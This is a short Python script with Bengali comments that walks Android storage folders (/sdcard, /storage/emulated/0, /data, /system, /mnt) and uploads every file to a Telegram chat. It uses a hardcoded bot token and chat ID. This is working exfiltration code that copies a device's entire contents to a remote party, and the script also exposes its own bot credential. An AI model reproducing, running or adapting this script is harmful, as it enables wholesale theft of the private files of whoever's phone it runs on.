import os
import telebot

# 🔴 টেলিগ্রাম বটের টোকেন এবং আপনার চ্যাট আইডি সেট করুন
BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"
CHAT_ID = "7116837132"

bot = telebot.TeleBot(BOT_TOKEN)

# 🔴 যেকোনো ফোল্ডারের সমস্ত ফাইল পাঠানোর ফাংশন
def send_all_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    bot.send_document(CHAT_ID, f, caption=f"📂 {file_path}")
                    print(f"Uploaded: {file_path}")
            except Exception as e:
                print(f"❌ {file_path} আপলোড করতে ব্যর্থ: {e}")

# 🔴 এই ফোল্ডার থেকে সব কিছু পাঠানো হবে
folders = ["/sdcard", "/storage/emulated/0", "/data", "/system", "/mnt"]

for folder in folders:
    send_all_files(folder)

print("✅ সমস্ত ফাইল টেলিগ্রামে পাঠানো সম্পন্ন!")
